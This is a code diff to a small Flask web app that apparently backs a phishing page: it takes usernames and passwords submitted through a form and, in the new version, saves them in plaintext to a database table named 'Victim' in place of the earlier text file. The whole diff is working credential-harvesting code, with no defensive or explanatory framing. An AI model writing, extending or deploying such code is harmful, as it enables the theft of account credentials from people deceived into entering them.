@@ -1,7 +1,16 @@
 from flask import Flask, request
 from flask.templating import render_template
+from flask_sqlalchemy import SQLAlchemy
 
 app = Flask(__name__)
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
+db = SQLAlchemy(app)
+
+
+class Victim(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    username = db.Column(db.String(180), nullable=False)
+    password = db.Column(db.String(120), nullable=False)
 
 
 @app.route('/', methods=['GET', 'POST'])
@@ -10,8 +19,12 @@ def home():
         username = request.form.get('username')
         password = request.form.get('password')
 
-        with open('data.txt', 'a') as f:
-            f.write(f'Username is: {username} and password is: {password}\n')
+        new_victim = Victim(
+            username = username,
+            password = password,
+        )
+        db.session.add(new_victim)
+        db.session.commit()
     
     return render_template('index.html')
 
